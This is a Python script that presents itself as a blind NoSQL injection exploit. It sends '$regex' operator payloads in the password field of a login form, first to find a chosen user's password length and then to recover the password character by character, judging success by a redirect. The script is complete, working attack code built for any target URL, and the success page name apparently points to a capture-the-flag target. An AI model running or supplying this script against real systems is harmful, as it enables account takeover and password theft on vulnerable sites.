import requests
import string
import argparse
import sys

# --- CONFIGURATION ---
SUCCESS_URL_ENDING = "sekr3tPl4ce.php" 
DEFAULT_COOKIE_NAME = "PHPSESSID"
# Charset includes: a-z, A-Z, 0-9
CHAR_SET = string.ascii_letters + string.digits
# --------------------

def check_match(url: str, username: str, session_id: str, regex: str) -> bool:
    """Sends POST request with regex payload and checks if the final URL indicates success."""
    cookies = {DEFAULT_COOKIE_NAME: session_id}
    payload = {
        "user": username,
        "pass[$regex]": regex,
        "remember": "on"
    }
    
    try:
        # requests automatically follows redirects (default behavior)
        r = requests.post(url, data=payload, cookies=cookies, timeout=5)
        
        # Success check: If final URL ends with the success page name
        return r.url.endswith(SUCCESS_URL_ENDING)
        
    except requests.exceptions.RequestException as e:
        print(f"[-] ERROR: Request failed: {e}")
        sys.exit(1)

def find_length(url: str, username: str, session_id: str, max_length: int) -> int or None:
    """Finds the password length using the regex: ^.{N}$"""
    print(f"\n[+] Searching for password length for user '{username}' (Max: {max_length})...")
    
    for length in range(1, max_length + 1):
        regex_pattern = f"^.{{{length}}}$"
        
        if check_match(url, username, session_id, regex_pattern):
            print(f"[!!!] SUCCESS! Password length is: {length}")
            return length
        else:
            print(f"  -> Testing length: {length} (Failed)")
            
    print(f"\n[-] Password length could not be found up to max length: {max_length}.")
    return None

def find_password(url: str, username: str, session_id: str, length: int) -> str or None:
    """Brute forces the password content character by character."""
    print(f"\n[+] Brute forcing password content (Length: {length})...")
    found_password = ""

    for i in range(length):
        found_char = False
        
        for char in CHAR_SET:
            current_guess = found_password + char
            remaining_length = length - len(current_guess)
            
            # Regex pattern: ^[known_part][tested_char][.{remaining}]
            regex_pattern = f"^{current_guess}.{{{remaining_length}}}$"
            
            if check_match(url, username, session_id, regex_pattern):
                found_password += char
                display_password = found_password.ljust(length, 'Â·')
                print(f"  [+] Found: {display_password} (Char: '{char}')")
                found_char = True
                break
                
        if not found_char:
            print(f"[-] ERROR: Character for position {i+1} not found. Check CHAR_SET.")
            return None

    return found_password

def main():
    parser = argparse.ArgumentParser(
        description="Blind NoSQL Injection Exploit. Finds password length and content.",
        epilog="Usage: python3 script.py -url <URL> -user <USERNAME> -session <SESSION_ID> -maxlength <N>"
    )
    
    # Arguments using single dash for simpler input
    parser.add_argument("-url", dest="url", help="Full URL of the login endpoint.", required=True)
    parser.add_argument("-user", dest="username", help="Target username whose password is to be cracked.", required=True)
    parser.add_argument("-session", dest="session_id", help=f"Valid {DEFAULT_COOKIE_NAME} cookie value.", required=True)
    parser.add_argument("-maxlength", dest="max_length", help="Maximum possible password length to check.", type=int, default=32)

    args = parser.parse_args()

    # --- Step 1: Find Length ---
    password_length = find_length(args.url, args.username, args.session_id, args.max_length)
    
    if password_length is None:
        sys.exit(1)
        
    # --- Step 2: Find Content ---
    final_password = find_password(args.url, args.username, args.session_id, password_length)

    if final_password:
        print(f"\n\n[!!!] FINAL PASSWORD CRACKED: {final_password}")
    else:
        print("\n[-] Password cracking failed.")

if __name__ == "__main__":
    main()
